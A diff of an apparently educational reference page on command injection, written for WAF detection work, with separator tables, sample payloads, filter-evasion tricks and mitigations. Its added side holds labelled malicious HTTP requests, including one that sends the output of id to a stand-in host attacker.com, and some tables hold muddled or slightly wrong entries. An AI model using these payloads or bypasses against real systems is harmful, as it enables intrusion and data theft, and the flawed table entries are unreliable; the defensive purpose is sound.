@@ -1,42 +1,145 @@
-# Command Injection (CMI) Attack Taxonomy
+# Attack Classes - CMDI
 
-Command Injection (CMI) occurs when an application passes unsafe user-supplied data to a system shell. In this scenario, the operating system executes the user-supplied data as system commands with the privileges of the vulnerable application.
+Command injection is an attack where the goal is to execute arbitrary commands on the host operating system via a vulnerable application.
+A web application is vulnerable to command injection if it passes unsanitized user input directly to the operating system shell. 
 
-This taxonomy documents the primary special characters and control sequences used in command injection payloads, their shell contexts (Linux `bash`/`sh` vs. Windows `cmd.exe`), and how they are interpreted. This is a critical reference for evaluating and training WAF models, as real-world HTTP traffic contains payloads targeting both backends.
+These user-supplied inputs can be:
+- Forms
+- Cookies
+- HTTP headers
+- URL parameters
+- File uploads
+- etc.
 
----
+This attack is different from code injection, which allows the attacker to add their own code that is then executed by the application. In command injection the attacker extends the default functionality of the application, which then executes system commands without having to inject code. 
 
-## Command Injection Control Characters
 
-| Character | Shell Context | Effect | Minimal Example |
-| :--- | :--- | :--- | :--- |
-| `;` | `bash/sh` | **Command Separator:** Executes the second command immediately after the first completes, regardless of the exit status of the first command. (Has no separator effect in `cmd.exe`). | `cat file.txt; id` |
-| `\|` | `both` | **Pipe / Redirection:** Redirects the standard output (stdout) of the left-hand command to the standard input (stdin) of the right-hand command. Often used to chain arbitrary utilities. | `echo hello \| id` |
-| `&&` | `both` | **Conditional AND:** Executes the second command only if the first command completes successfully (exits with code `0`). | `ping -c 1 8.8.8.8 && id` *(Linux)*<br>`ping -n 1 8.8.8.8 && whoami` *(Windows)* |
-| `\|\|` | `both` | **Conditional OR:** Executes the second command only if the first command fails (exits with a non-zero code). | `false \|\| id` *(Linux)*<br>`dir non_existent_file \|\| whoami` *(Windows)* |
-| `` ` `` (backtick) | `bash/sh` | **Command Substitution:** Executes the command inside the backticks in a subshell and replaces the backtick expression with the command's standard output. (Does not work in `cmd.exe`). | `` echo `id` `` |
-| `$()` | `bash/sh` | **Command Substitution (Modern):** Executes the command inside the parentheses in a subshell and replaces the expression with the stdout. Supports nesting. (Does not work in `cmd.exe`). | `echo $(id)` |
-| `&` | `both` | **Asynchronous / Command Separator:**<br>• `bash/sh`: Backgrounds the first command (runs asynchronously) and runs the second command immediately.<br>• `cmd.exe`: Sequential separator. Operates identically to `;` in Linux, running the second command after the first completes. | `sleep 10 & id` *(Linux)*<br>`dir & whoami` *(Windows)* |
-| `\n` (newline) | `both` | **Line / Command Separator:** Breaks commands into separate lines. In CMI, it acts as a separator when the application processes inputs line-by-line or executes multi-line command strings directly in the shell. | `id\nwhoami` *(Linux)*<br>`dir\nwhoami` *(Windows)* |
-| `%0a` | `both` | **URL-encoded Line Feed:** When the web application URL-decodes user inputs prior to shell execution, `%0a` becomes a raw newline (`\n`), acting as a stealthy command separator that bypasses basic character blocklists. | `id%0awhoami` |
-| `%00` | `both` | **URL-encoded Null Byte:** String terminator in C/C++ and many backend languages (e.g., PHP, Perl, Python). Used in CMI to truncate trailing characters or file extensions appended by the application logic, ensuring the injected command is executed cleanly. | `id; %00` *(prevents trailing appended args from running)*<br>`cat /etc/passwd%00.txt` *(bypasses trailing extension checks)* |
+## Characterisitics
 
----
+These are the common characteristics that define a command injection attack. 
 
-## Contextual Differences & WAF Implications
+- User-supplied data passed directly to an OS shell
+- Uses special characters to break out of the intended command
+- Can lead to remote code execution (RCE)
+- Platform-specific syntax (Linux vs. Windows)
+- Exploits trust in application-level validation
+- Often requires URL encoding or obscure characters to bypass filters
 
-When analyzing command injection in a WAF context, understanding the backend shell environment is critical:
+### Common Special Characters
 
-### 1. Windows (`cmd.exe`) vs. Linux (`bash`/`sh`) Separators
-- **Semicolon (`;`)**: Frequently blocked by naive WAFs. While it is highly effective on Linux, it is ignored or causes syntax errors on Windows.
-- **Ampersand (`&`)**: On Windows `cmd.exe`, `&` acts as the primary command separator. On Linux, `&` backgrounds the first process, which might suppress stdout but still executes both commands.
-- **PowerShell**: If the Windows backend uses PowerShell instead of `cmd.exe`, standard Unix-like operators (like `;`) are supported, making PowerShell payloads syntactically closer to Linux payloads.
+These are the most common special characters used in command injection attacks:
 
-### 2. Command Substitution
-- Backticks (`` ` ``) and `$()` are native to Unix shells.
-- In Windows `cmd.exe`, command execution inside strings is typically achieved using the `FOR /F` command or by using variable expansion (e.g., `cmd.exe /c "set CMD=whoami && %CMD%"`).
+- `;` - command separator
+- `|` - pipe
+- `&` - ampersand
+- `&&` - conditional AND
+- `||` - conditional OR
+- `` ` `` - backtick (command substitution)
+- `$()` - command substitution
+- `\n` - newline
+- `%0a` - URL-encoded newline
+- `%00` - null byte
 
-### 3. Whitespace Bypass
-- If spaces are blocked or stripped by a filter, different shells support different whitespace substitutes:
-  - `bash/sh`: `${IFS}` (Internal Field Separator), `$IFS$9`, or brace expansion (e.g., `{cat,/etc/passwd}`).
-  - `cmd.exe`: `%ProgramFiles:~10,1%` (extracting spaces from environment variables) or using commas/semicolons between arguments (e.g., `ping,127.0.0.1`).
+### Common Payloads
+
+Here are some common command injection payloads:
+
+**Linux:**
+```
+id
+cat /etc/passwd
+ls -la
+echo 1 | cat /etc/passwd
+```
+
+**Windows:**
+```
+whoami
+ver
+dir
+echo 1 | dir
+```
+
+**Cross-platform:**
+```
+id;whoami
+cat /etc/passwd;id
+echo 1 | cat /etc/passwd;id
+```
+
+### Payload Examples 
+
+[BENIGN]
+GET /api/report?filename=Q1_report.pdf HTTP/1.1
+Host: target.example.com
+
+[MALICIOUS] *Semicolon Chaining*
+GET /api/report?filename=Q1_report.pdf;whoami HTTP/1.1
+Host: target.example.com
+
+[MALICIOUS] *URL-encoded Newline Injection*
+GET /api/report?filename=Q1_report.pdf%0Awhoami HTTP/1.1
+Host: target.example.com
+
+[MALICIOUS] *Pipe Chaining*
+GET /api/report?filename=Q1_report.pdf|whoami HTTP/1.1
+Host: target.example.com
+
+[MALICIOUS] *Command Substitution with Exfiltration*
+GET /api/report?filename=$(curl+http://attacker.com/$(id)) HTTP/1.1
+Host: target.example.com
+
+### Obfuscation Techniques 
+
+- Encoding Evasion: Web servers automatically decode URL parameters before processing them. If a signature look-up blocks a raw semicolon, passing %3b allows the payload to transit the WAF cleanly. The backend web server decodes %3b back into ; right before passing the string to an unsafe execution function like PHP's system() or Node's child_process.exec()
+
+| Special character | URL-encoded form | Purpose | Bypassed By |
+|-------------------|------------------|---------|-------------|
+| `;` (Semicolon) | `%3b` | Sequential command execution | `cat%3bwhoami` |
+| `|` (Pipe) | `%7c` | Inter-process data redirection | `cat%7cwhoami` |
+| `\n` (Newline) | `%0a` | Logical separator operating like a semicolon | `cat%0awhoami` |
+| `&` (Ampersand) | `%26` | Conditional execution | `cat%26whoami` |
+| `` ` `` (Backtick) | `%60` | Command substitution | `` `whoami` `` |
+
+| Encoding Level | Encoded Value | Decoded Value | bypasses | notes |
+|----------------|---------------|---------------|----------|-------|
+| URL (single) | %3B %7C %0a | ; | yes | standard evasion |
+| Double | %253B %257C %250A | ; | yes | evades WAF decoders |
+| URL + Bash variable | %3B%20cat${IFS}/etc/passwd | ; cat /etc/passwd | yes | evades whitespace rules |
+| Mixed encoding | %3B%257C%0A | ;| | yes | evades WAF logic | 
+
+- Whitespace Substitution: In Bash and sh, $IFS is an environmental variable defining the exact characters used as field boundaries. By default, its value contains a space, a tab, and a newline ( \t\n).
+
+| Whitespace character | Bash syntax | Purpose | Bypass WAF? |
+|----------------------|-------------|---------|-------------|
+| Tab | \t or $'	' | Standard delimiter | Yes |
+| Newline | \n or $'\n' | Breaks command | Yes |
+| Bash-specific control character | ${IFS} | Uses built-in separator | Yes |
+| Bash-specific control character | \x09, \x0a | Hexadecimal encoding | Yes |
+| Backtick-escaped | \`\` | Evades literal whitespace match | Yes |
+
+- Command Substitution Chaining: Command substitution runs a subshell command and swaps the standard output directly into the host string. Attackers chain these forms to break regular expression patterns that are looking for single-layered, linear command strings. 
+
+| Substitution form | Syntax | Behavior | Bypasses regex |
+|--------------------|--------|----------|----------------|
+| Backtick | \`cmd\` | Executes command; output replaces backticks | Yes |
+| $() | \$(cmd) | Executes command; output replaces $() | Yes |
+| Nested | \`\`cmd\`\` | Nested execution | Yes |
+| Mixed nesting | \`$(cmd)\' | Alternates syntax | Yes |
+
+
+## Mitigations
+
+- Input Validation: Use an allow list instead of a block list. Instead of trying to remove known bad characters, define exactly what input is valid and reject anything that falls outside of that.
+
+- Parameterized Queries: Write code that separates user-supplied input from OS-level system calls. Use language-specific APIs that are designed to handle external data safely.
+
+- Least Privilege: Run all application services with the minimum level of permissions necessary to perform their function. This ensures that even if a command injection attack is successful, the potential damage is contained.
+
+- Avoid OS Command Execution: Try to avoid using OS command execution functions in your code. If you must use them, use them with extreme caution. 
+
+
+**References:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html) · [OWASP A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
+
+
+
